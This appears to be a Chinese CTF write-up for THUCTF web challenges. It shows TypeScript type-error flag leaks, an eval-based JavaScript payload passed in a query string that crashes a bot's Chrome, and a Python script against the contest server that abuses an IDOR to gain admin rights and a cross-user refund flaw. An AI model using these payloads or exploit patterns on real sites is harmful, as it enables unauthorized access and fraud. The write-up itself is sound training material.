<p><picture><source type="image/webp" srcset="/assets/c-flag1.2143688c.webp"><img srcset="/assets/c-flag1.4e495dd8.png" loading="lazy" src="/assets/c-flag1.4e495dd8.png" width="411" height="550" alt="flag1"></picture></p>
<h2 id="web" class="heading"><a href="#web" class="heading-anchor" aria-label="章节： Web" tabindex="-1"></a><span>Web</span></h2>
<h3 id="简单的打字稿" class="heading"><a href="#简单的打字稿" class="heading-anchor" aria-label="章节： 简单的打字稿" tabindex="-1"></a><span>简单的打字稿</span></h3>
<a id="unintended-solution" name="unintended-solution" aria-hidden="true"></a>
<aside role="note" data-v-a2ab257f><div class="shadow-md rd-1 b-l-6 my-6 bg-blue-1 dark:bg-blue-9 b-blue" data-v-a2ab257f><div class="p-3 flex justify-between items-center" data-v-a2ab257f><h4 class="flex items-center gap-1 font-bold" data-v-a2ab257f><span class="text-5 i-mdi-info-circle-outline text-blue" data-v-a2ab257f></span><span class="sr-only" data-v-a2ab257f>Info: </span><span data-v-a2ab257f>unintended solution</span></h4><!--v-if--></div><div class="overflow-auto rd-br-1 bg-card px-6 dark:bg-bghover" data-v-a2ab257f><p>隔壁 GeekGame 的 flag 是 <code>flag{.+}</code><span class="mojikumi-line-end">，</span>用下面的做法会因为输出含 <code>flag</code> 而<span class="mojikumi-line-start">“</span>绷<span class="mojikumi">”</span><span class="mojikumi-line-end">，</span>但 THUCTF 的 flag 里不含 <code>flag</code><span class="mojikumi-line-start">（</span></p></div></div></aside>
<h4 id="level-1-10" class="heading"><a href="#level-1-10" class="heading-anchor" aria-label="章节： Level 1" tabindex="-1"></a><span>Level 1</span></h4>
<p>触发 <code>flag1</code> 的类型错误<span class="mojikumi-line-end">，</span>查看错误信息即可<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="TypeScript 代码块" data-v-ad49d235>TypeScript</h5><ile-root id="ile-19"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-19--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">function</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">f</span><span style="color: #D9F5DD">(</span><span style="color: #D7DBE0">a</span><span style="color: #7FDBCA">:</span><span style="color: #D6DEEB"> </span><span style="color: #FFCB8B">flag1</span><span style="color: #D9F5DD">)</span><span style="color: #7FDBCA">:</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">null</span><span style="color: #D6DEEB"> {</span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #C792EA">return</span><span style="color: #D6DEEB"> a;</span></span>
<span><span style="color: #D6DEEB">}</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">function</span><span style="color: #403F53"> </span><span style="color: #4876D6">f</span><span style="color: #111111">(</span><span style="color: #403F53">a</span><span style="color: #0C969B">:</span><span style="color: #403F53"> </span><span style="color: #111111">flag1)</span><span style="color: #0C969B">:</span><span style="color: #403F53"> </span><span style="color: #4876D6">null</span><span style="color: #403F53"> {</span></span>
<span><span style="color: #403F53">  </span><span style="color: #994CC3">return</span><span style="color: #403F53"> a;</span></span>
<span><span style="color: #403F53">}</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/ts-flag1.cb04eaa0.webp"><img srcset="/assets/ts-flag1.4a207953.png" loading="lazy" src="/assets/ts-flag1.4a207953.png" width="905" height="882" alt="flag1"></picture></p>
<h4 id="level-2-7" class="heading"><a href="#level-2-7" class="heading-anchor" aria-label="章节： Level 2" tabindex="-1"></a><span>Level 2</span></h4>
<p>同样是触发类型错误<span class="mojikumi-line-end">，</span>由于类型较为复杂<span class="mojikumi-line-end">，</span>获取到内部类型需要对 TypeScript 有更多的了解<span class="mojikumi-line-end">。</span>主要难点在于整个输出有长度限制<span class="mojikumi-line-end">。</span>在本地查看错误信息可以发现<span class="mojikumi-line-end">，</span>错误信息中包含类型以及对应的源代码那一行<span class="mojikumi-line-end">，</span>所以可以从这两方面来缩短错误信息长度<span class="mojikumi-line-end">，</span>一是使用名字短的类型 <code>any</code><span class="mojikumi-line-end">，</span>二是将报错的那一行缩短为只有单个字符 <code>(</code><span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h5 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="TypeScript 代码块" data-v-ad49d235>TypeScript</h5><ile-root id="ile-20"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-20--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">function</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">f</span><span style="color: #D9F5DD">(</span><span style="color: #D7DBE0">c</span><span style="color: #7FDBCA">:</span><span style="color: #D6DEEB"> </span><span style="color: #FFCB8B">flag2</span><span style="color: #D9F5DD">)</span><span style="color: #D6DEEB"> {</span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #C792EA">if</span><span style="color: #D6DEEB"> (</span><span style="color: #C792EA">!</span><span style="color: #D6DEEB">(</span><span style="color: #D9F5DD">&#39;</span><span style="color: #ECC48D">prototype</span><span style="color: #D9F5DD">&#39;</span><span style="color: #D6DEEB"> </span><span style="color: #7FDBCA">in</span><span style="color: #D6DEEB"> c)) </span><span style="color: #C792EA">return</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #C792EA">const </span><span style="color: #82AAFF">v</span><span style="color: #C792EA"> = </span><span style="color: #D6DEEB">(</span><span style="color: #7FDBCA">new</span><span style="color: #C792EA"> </span><span style="color: #82AAFF">c</span><span style="color: #D6DEEB">())</span><span style="color: #C792EA">.</span><span style="color: #82AAFF">v</span><span style="color: #D6DEEB">();</span></span>
<span></span>
<span><span style="color: #D6DEEB">  </span><span style="color: #82AAFF">v</span><span style="color: #D6DEEB">(</span></span>
<span><span style="color: #D6DEEB">(</span></span>
<span><span style="color: #D6DEEB">    a: any</span><span style="color: #5F7E97">,</span><span style="color: #D6DEEB"> b: any)</span><span style="color: #7FDBCA">:</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">null</span><span style="color: #D6DEEB"> </span><span style="color: #C792EA">=&gt;</span><span style="color: #D6DEEB"> {</span></span>
<span><span style="color: #D6DEEB">      </span><span style="color: #C792EA">return</span><span style="color: #D6DEEB"> </span><span style="color: #FF5874">null</span><span style="color: #D6DEEB">;</span></span>
<span><span style="color: #D6DEEB">  });</span></span>
<span><span style="color: #D6DEEB">}</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">function</span><span style="color: #403F53"> </span><span style="color: #4876D6">f</span><span style="color: #111111">(</span><span style="color: #403F53">c</span><span style="color: #0C969B">:</span><span style="color: #403F53"> </span><span style="color: #111111">flag2)</span><span style="color: #403F53"> {</span></span>
<span><span style="color: #403F53">  </span><span style="color: #994CC3">if</span><span style="color: #403F53"> (</span><span style="color: #994CC3">!</span><span style="color: #403F53">(</span><span style="color: #111111">&#39;</span><span style="color: #C96765">prototype</span><span style="color: #111111">&#39;</span><span style="color: #403F53"> </span><span style="color: #0C969B">in</span><span style="color: #403F53"> c)) </span><span style="color: #994CC3">return</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">  </span><span style="color: #994CC3">const </span><span style="color: #4876D6">v</span><span style="color: #994CC3"> = </span><span style="color: #403F53">(</span><span style="color: #0C969B">new</span><span style="color: #994CC3"> </span><span style="color: #4876D6">c</span><span style="color: #403F53">())</span><span style="color: #994CC3">.</span><span style="color: #4876D6">v</span><span style="color: #403F53">();</span></span>
<span></span>
<span><span style="color: #403F53">  </span><span style="color: #4876D6">v</span><span style="color: #403F53">(</span></span>
<span><span style="color: #403F53">(</span></span>
<span><span style="color: #403F53">    a: any</span><span style="color: #5F7E97">,</span><span style="color: #403F53"> b: any)</span><span style="color: #0C969B">:</span><span style="color: #403F53"> </span><span style="color: #4876D6">null</span><span style="color: #403F53"> </span><span style="color: #994CC3">=&gt;</span><span style="color: #403F53"> {</span></span>
<span><span style="color: #403F53">      </span><span style="color: #994CC3">return</span><span style="color: #403F53"> </span><span style="color: #BC5454">null</span><span style="color: #403F53">;</span></span>
<span><span style="color: #403F53">  });</span></span>
<span><span style="color: #403F53">}</span></span></code></pre></div></section>
<p><picture><source type="image/webp" srcset="/assets/ts-flag2.57a81b39.webp"><img srcset="/assets/ts-flag2.7170a787.png" loading="lazy" src="/assets/ts-flag2.7170a787.png" width="848" height="910" alt="flag2"></picture></p>
<h3 id="chrone" class="heading"><a href="#chrone" class="heading-anchor" aria-label="章节： Chrone" tabindex="-1"></a><span>Chrone</span></h3>
<h4 id="level-1-11" class="heading"><a href="#level-1-11" class="heading-anchor" aria-label="章节： Level 1" tabindex="-1"></a><span>Level 1</span></h4>
<p>将 query string 设得非常长<span class="mojikumi-line-end">，</span>可以触发 431 Request Header Fields Too Large 错误<span class="mojikumi-line-end">，</span>而在 Chrome 中<span class="mojikumi-line-end">，</span>此时标签页的地址会被设为 <code>chrome<wbr>-<wbr>error<wbr>://<wbr>chromewebdata<wbr>/</code><span class="mojikumi-line-end">，</span>就达到了题目要求的效果<span class="mojikumi-line-end">。</span></p>
<p>payload 可以是 <code>/<wbr>note<wbr>?<wbr>text<wbr>=<wbr>i_<wbr>want_<wbr>flag1i_<wbr>want_<wbr>flag1<wbr>……<wbr>i_<wbr>want_<wbr>flag1</code><span class="mojikumi-line-end">，</span>加长到报错为止<span class="mojikumi-line-end">。</span></p>
<p><picture><source type="image/webp" srcset="/assets/chrone-flag1.8edd1041.webp"><img srcset="/assets/chrone-flag1.aa7bb54a.png" loading="lazy" src="/assets/chrone-flag1.aa7bb54a.png" width="574" height="91" alt="flag1"></picture></p>
<h4 id="level-2-8" class="heading"><a href="#level-2-8" class="heading-anchor" aria-label="章节： Level 2" tabindex="-1"></a><span>Level 2</span></h4>
<p>根据提示<span class="mojikumi-line-end">，</span>需要在这个 <code>chrome<wbr>-<wbr>error<wbr>://<wbr>chromewebdata</code> 插入 DOM 元素让整个浏览器 crash<span class="mojikumi-line-end">。</span></p>
<p>测试的时候可以用 Chrome 开一个 431 的标签页然后在 devtool 运行 JS<span class="mojikumi-line-end">。</span>试了下发现插入 <code>iframe</code> 可以让标签页 crash 但浏览器没有 crash<span class="mojikumi-line-end">。</span>再尝试修改 <code>src</code><span class="mojikumi-line-end">，</span>发现 <code>src</code> 非空时不会 crash<span class="mojikumi-line-end">，</span>但如果插入时非空<span class="mojikumi-line-end">，</span>插入后再修改为空<span class="mojikumi-line-end">，</span>就会 crash<span class="mojikumi-line-end">。</span>代码为 <code>e<wbr>=<wbr>document<wbr>.<wbr>createElement<wbr>('<wbr>iframe<wbr>'); <wbr>e<wbr>.<wbr>src<wbr>='<wbr>http<wbr>://<wbr>localhost<wbr>:<wbr>8000<wbr>/'; <wbr>document<wbr>.<wbr>body<wbr>.<wbr>append<wbr>(<wbr>e<wbr>); <wbr>e<wbr>.<wbr>src<wbr>=''</code><span class="mojikumi-line-end">。</span></p>
<p>最后要让 bot 执行代码<span class="mojikumi-line-end">，</span>由于是多句代码<span class="mojikumi-line-end">，</span>可以用 <code>eval</code> 变成一句<span class="mojikumi-line-end">。</span>payload 为 <code>/<wbr>note<wbr>?<wbr>js<wbr>=<wbr>eval<wbr>(%<wbr>22e<wbr>%<wbr>3Ddocument<wbr>.<wbr>createElement<wbr>('<wbr>iframe<wbr>')%<wbr>3B<wbr>%<wbr>20e<wbr>.<wbr>src<wbr>%<wbr>3D<wbr>'<wbr>http<wbr>%<wbr>3A<wbr>%<wbr>2F<wbr>%<wbr>2Flocalhost<wbr>%<wbr>3A8000<wbr>%<wbr>2F<wbr>'%<wbr>3B<wbr>%<wbr>20document<wbr>.<wbr>body<wbr>.<wbr>append<wbr>(<wbr>e<wbr>)%<wbr>3B<wbr>%<wbr>20e<wbr>.<wbr>src<wbr>%<wbr>3D<wbr>''%<wbr>22<wbr>)&#x26;<wbr>text<wbr>=<wbr>aaaaaaaaaa<wbr>……</code></p>
<p><picture><source type="image/webp" srcset="/assets/chrone-flag2.3c2754b0.webp"><img srcset="/assets/chrone-flag2.19c92e64.png" loading="lazy" src="/assets/chrone-flag2.19c92e64.png" width="518" height="76" alt="flag2"></picture></p>
<h3 id="v-me-50" class="heading"><a href="#v-me-50" class="heading-anchor" aria-label="章节： V ME 50" tabindex="-1"></a><span>V ME 50</span></h3>
<p>注册登录后可以在注释中看到 <code>role_change<wbr>.<wbr>php</code><span class="mojikumi-line-end">，</span>直接修改提示没有权限<span class="mojikumi-line-end">，</span>但有一个 hidden field <code>id</code><span class="mojikumi-line-end">，</span>可以发现第一个注册的用户 id 是 2<span class="mojikumi-line-end">，</span>第二个注册的是 3<span class="mojikumi-line-end">，</span>猜测 1 是管理员<span class="mojikumi-line-end">，</span>改为 1 即可成功修改权限<span class="mojikumi-line-end">。</span></p>
<p>然后可以购买物品以及退款<span class="mojikumi-line-end">。</span>试了下发现一个用户购买的物品可以被另一个用户退款<span class="mojikumi-line-end">，</span>所以多注册几个用户退款到同一个用户就有钱买 flag 了<span class="mojikumi-line-end">。</span></p>
<section class="code-block relative my-6 shadow" itemprop="hasPart" itemscope itemtype="https://schema.org/SoftwareSourceCode" data-v-ad49d235><div class="h-6 items-center rd-t-1 bg-area px-4 dark:bg-#2A313A media-screen:important-flex" style="display:none;" data-v-ad49d235><h4 class="text-3 text-footer" itemprop="programmingLanguage" aria-label="Python 代码块" data-v-ad49d235>Python</h4><ile-root id="ile-21"><button title="复制到剪贴板" class="copy-button b-footer text-footer" data-v-9288569d><span class="i-mdi-content-copy" data-v-9288569d></span><span class="sr-only" role="status" data-v-9288569d></span></button></ile-root><!--ISLAND_HYDRATION_PLACEHOLDER_ile-21--></div><div class="light:hidden" itemprop="text" data-v-ad49d235><pre class="shiki dark" style="background-color: #011627" tabindex="0"><code><span><span style="color: #C792EA">import</span><span style="color: #D6DEEB"> requests</span></span>
<span></span>
<span><span style="color: #D6DEEB">url </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">http://chal.thuctf.redbud.info:50970</span><span style="color: #D9F5DD">&quot;</span></span>
<span></span>
<span><span style="color: #D6DEEB">session </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> requests.</span><span style="color: #B2CCD6">session</span><span style="color: #D6DEEB">()</span></span>
<span></span>
<span><span style="color: #C792EA">def</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">register</span><span style="color: #D9F5DD">(</span><span style="color: #7FDBCA">username</span><span style="color: #D9F5DD">)</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    session.</span><span style="color: #B2CCD6">post</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">f</span><span style="color: #ECC48D">&quot;</span><span style="color: #82AAFF">{url}</span><span style="color: #ECC48D">/register.php&quot;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D7DBE0">data</span><span style="color: #C792EA">=</span><span style="color: #82AAFF">{</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">username</span><span style="color: #D9F5DD">&quot;</span><span style="color: #82AAFF">: username, </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">password</span><span style="color: #D9F5DD">&quot;</span><span style="color: #82AAFF">: </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">1</span><span style="color: #D9F5DD">&quot;</span><span style="color: #82AAFF">}</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #C792EA">def</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">login</span><span style="color: #D9F5DD">(</span><span style="color: #7FDBCA">username</span><span style="color: #D9F5DD">)</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    session.</span><span style="color: #B2CCD6">post</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">f</span><span style="color: #ECC48D">&quot;</span><span style="color: #82AAFF">{url}</span><span style="color: #ECC48D">/login.php&quot;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D7DBE0">data</span><span style="color: #C792EA">=</span><span style="color: #82AAFF">{</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">username</span><span style="color: #D9F5DD">&quot;</span><span style="color: #82AAFF">: username, </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">password</span><span style="color: #D9F5DD">&quot;</span><span style="color: #82AAFF">: </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">1</span><span style="color: #D9F5DD">&quot;</span><span style="color: #82AAFF">}</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #C792EA">def</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">changerole</span><span style="color: #D9F5DD">(</span><span style="color: #7FDBCA">username</span><span style="color: #D9F5DD">)</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    session.</span><span style="color: #B2CCD6">post</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">f</span><span style="color: #ECC48D">&quot;</span><span style="color: #82AAFF">{url}</span><span style="color: #ECC48D">/role_change.php&quot;</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #D7DBE0">data</span><span style="color: #C792EA">=</span><span style="color: #82AAFF">{</span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">username</span><span style="color: #D9F5DD">&quot;</span><span style="color: #82AAFF">: username, </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">id</span><span style="color: #D9F5DD">&quot;</span><span style="color: #82AAFF">: </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">1</span><span style="color: #D9F5DD">&quot;</span><span style="color: #82AAFF">, </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">role</span><span style="color: #D9F5DD">&quot;</span><span style="color: #82AAFF">: </span><span style="color: #D9F5DD">&quot;</span><span style="color: #ECC48D">1</span><span style="color: #D9F5DD">&quot;</span><span style="color: #82AAFF">}</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #C792EA">def</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">buy</span><span style="color: #D9F5DD">(</span><span style="color: #7FDBCA">id</span><span style="color: #D9F5DD">)</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    session.</span><span style="color: #B2CCD6">get</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">f</span><span style="color: #ECC48D">&quot;</span><span style="color: #82AAFF">{url}</span><span style="color: #ECC48D">/goods_api.php?method=buy&amp;id=</span><span style="color: #82AAFF">{</span><span style="color: #C5E478">id</span><span style="color: #82AAFF">}</span><span style="color: #ECC48D">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #C792EA">def</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">refund</span><span style="color: #D9F5DD">(</span><span style="color: #7FDBCA">id</span><span style="color: #D9F5DD">)</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    session.</span><span style="color: #B2CCD6">get</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">f</span><span style="color: #ECC48D">&quot;</span><span style="color: #82AAFF">{url}</span><span style="color: #ECC48D">/refund.php?method=cancel&amp;id=</span><span style="color: #82AAFF">{</span><span style="color: #C5E478">id</span><span style="color: #82AAFF">}</span><span style="color: #ECC48D">&quot;</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #C792EA">def</span><span style="color: #D6DEEB"> </span><span style="color: #82AAFF">check</span><span style="color: #D9F5DD">(</span><span style="color: #7FDBCA">id</span><span style="color: #D9F5DD">)</span><span style="color: #D6DEEB">:</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #C5E478">print</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">session.</span><span style="color: #B2CCD6">get</span><span style="color: #D6DEEB">(</span><span style="color: #C792EA">f</span><span style="color: #ECC48D">&quot;</span><span style="color: #82AAFF">{url}</span><span style="color: #ECC48D">/goods_api.php?method=check&amp;id=</span><span style="color: #82AAFF">{</span><span style="color: #C5E478">id</span><span style="color: #82AAFF">}</span><span style="color: #ECC48D">&quot;</span><span style="color: #D6DEEB">)</span><span style="color: #82AAFF">.text</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">10</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">    u </span><span style="color: #C792EA">=</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">str</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">i</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #B2CCD6">register</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">u</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #B2CCD6">login</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">u</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #B2CCD6">changerole</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">u</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #B2CCD6">buy</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #B2CCD6">buy</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">1</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #C792EA">for</span><span style="color: #D6DEEB"> i </span><span style="color: #C792EA">in</span><span style="color: #D6DEEB"> </span><span style="color: #C5E478">range</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">1</span><span style="color: #D9F5DD">,</span><span style="color: #82AAFF"> </span><span style="color: #F78C6C">21</span><span style="color: #D6DEEB">):</span></span>
<span><span style="color: #D6DEEB">    </span><span style="color: #B2CCD6">refund</span><span style="color: #D6DEEB">(</span><span style="color: #82AAFF">i</span><span style="color: #D6DEEB">)</span></span>
<span></span>
<span><span style="color: #B2CCD6">buy</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">2</span><span style="color: #D6DEEB">)</span></span>
<span><span style="color: #B2CCD6">check</span><span style="color: #D6DEEB">(</span><span style="color: #F78C6C">21</span><span style="color: #D6DEEB">)</span></span></code></pre></div><div class="light:important-block" style="display:none;" data-v-ad49d235><pre class="shiki light" style="background-color: #FBFBFB" tabindex="0"><code><span><span style="color: #994CC3">import</span><span style="color: #403F53"> requests</span></span>
<span></span>
<span><span style="color: #403F53">url </span><span style="color: #994CC3">=</span><span style="color: #403F53"> </span><span style="color: #111111">&quot;</span><span style="color: #C96765">http://chal.thuctf.redbud.info:50970</span><span style="color: #111111">&quot;</span></span>
<span></span>
<span><span style="color: #403F53">session </span><span style="color: #994CC3">=</span><span style="color: #403F53"> requests.</span><span style="color: #0C969B">session</span><span style="color: #403F53">()</span></span>
<span></span>
<span><span style="color: #994CC3">def</span><span style="color: #403F53"> </span><span style="color: #4876D6">register</span><span style="color: #111111">(</span><span style="color: #0C969B">username</span><span style="color: #111111">)</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    session.</span><span style="color: #0C969B">post</span><span style="color: #403F53">(</span><span style="color: #994CC3">f</span><span style="color: #C96765">&quot;</span><span style="color: #4876D6">{url}</span><span style="color: #C96765">/register.php&quot;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #403F53">data</span><span style="color: #994CC3">=</span><span style="color: #4876D6">{</span><span style="color: #111111">&quot;</span><span style="color: #C96765">username</span><span style="color: #111111">&quot;</span><span style="color: #4876D6">: username, </span><span style="color: #111111">&quot;</span><span style="color: #C96765">password</span><span style="color: #111111">&quot;</span><span style="color: #4876D6">: </span><span style="color: #111111">&quot;</span><span style="color: #C96765">1</span><span style="color: #111111">&quot;</span><span style="color: #4876D6">}</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #994CC3">def</span><span style="color: #403F53"> </span><span style="color: #4876D6">login</span><span style="color: #111111">(</span><span style="color: #0C969B">username</span><span style="color: #111111">)</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    session.</span><span style="color: #0C969B">post</span><span style="color: #403F53">(</span><span style="color: #994CC3">f</span><span style="color: #C96765">&quot;</span><span style="color: #4876D6">{url}</span><span style="color: #C96765">/login.php&quot;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #403F53">data</span><span style="color: #994CC3">=</span><span style="color: #4876D6">{</span><span style="color: #111111">&quot;</span><span style="color: #C96765">username</span><span style="color: #111111">&quot;</span><span style="color: #4876D6">: username, </span><span style="color: #111111">&quot;</span><span style="color: #C96765">password</span><span style="color: #111111">&quot;</span><span style="color: #4876D6">: </span><span style="color: #111111">&quot;</span><span style="color: #C96765">1</span><span style="color: #111111">&quot;</span><span style="color: #4876D6">}</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #994CC3">def</span><span style="color: #403F53"> </span><span style="color: #4876D6">changerole</span><span style="color: #111111">(</span><span style="color: #0C969B">username</span><span style="color: #111111">)</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    session.</span><span style="color: #0C969B">post</span><span style="color: #403F53">(</span><span style="color: #994CC3">f</span><span style="color: #C96765">&quot;</span><span style="color: #4876D6">{url}</span><span style="color: #C96765">/role_change.php&quot;</span><span style="color: #111111">,</span><span style="color: #4876D6"> </span><span style="color: #403F53">data</span><span style="color: #994CC3">=</span><span style="color: #4876D6">{</span><span style="color: #111111">&quot;</span><span style="color: #C96765">username</span><span style="color: #111111">&quot;</span><span style="color: #4876D6">: username, </span><span style="color: #111111">&quot;</span><span style="color: #C96765">id</span><span style="color: #111111">&quot;</span><span style="color: #4876D6">: </span><span style="color: #111111">&quot;</span><span style="color: #C96765">1</span><span style="color: #111111">&quot;</span><span style="color: #4876D6">, </span><span style="color: #111111">&quot;</span><span style="color: #C96765">role</span><span style="color: #111111">&quot;</span><span style="color: #4876D6">: </span><span style="color: #111111">&quot;</span><span style="color: #C96765">1</span><span style="color: #111111">&quot;</span><span style="color: #4876D6">}</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #994CC3">def</span><span style="color: #403F53"> </span><span style="color: #4876D6">buy</span><span style="color: #111111">(</span><span style="color: #0C969B">id</span><span style="color: #111111">)</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    session.</span><span style="color: #0C969B">get</span><span style="color: #403F53">(</span><span style="color: #994CC3">f</span><span style="color: #C96765">&quot;</span><span style="color: #4876D6">{url}</span><span style="color: #C96765">/goods_api.php?method=buy&amp;id=</span><span style="color: #4876D6">{id}</span><span style="color: #C96765">&quot;</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #994CC3">def</span><span style="color: #403F53"> </span><span style="color: #4876D6">refund</span><span style="color: #111111">(</span><span style="color: #0C969B">id</span><span style="color: #111111">)</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    session.</span><span style="color: #0C969B">get</span><span style="color: #403F53">(</span><span style="color: #994CC3">f</span><span style="color: #C96765">&quot;</span><span style="color: #4876D6">{url}</span><span style="color: #C96765">/refund.php?method=cancel&amp;id=</span><span style="color: #4876D6">{id}</span><span style="color: #C96765">&quot;</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #994CC3">def</span><span style="color: #403F53"> </span><span style="color: #4876D6">check</span><span style="color: #111111">(</span><span style="color: #0C969B">id</span><span style="color: #111111">)</span><span style="color: #403F53">:</span></span>
<span><span style="color: #403F53">    </span><span style="color: #4876D6">print</span><span style="color: #403F53">(</span><span style="color: #4876D6">session.</span><span style="color: #0C969B">get</span><span style="color: #403F53">(</span><span style="color: #994CC3">f</span><span style="color: #C96765">&quot;</span><span style="color: #4876D6">{url}</span><span style="color: #C96765">/goods_api.php?method=check&amp;id=</span><span style="color: #4876D6">{id}</span><span style="color: #C96765">&quot;</span><span style="color: #403F53">)</span><span style="color: #4876D6">.text</span><span style="color: #403F53">)</span></span>
<span></span>
<span><span style="color: #994CC3">for</span><span style="color: #403F53"> i </span><span style="color: #994CC3">in</span><span style="color: #403F53"> </span><span style="color: #4876D6">range</span><span style="color: #403F53">(</span><span style="color: #AA0982">10</span><span style="color: #403F53">):</span></span>
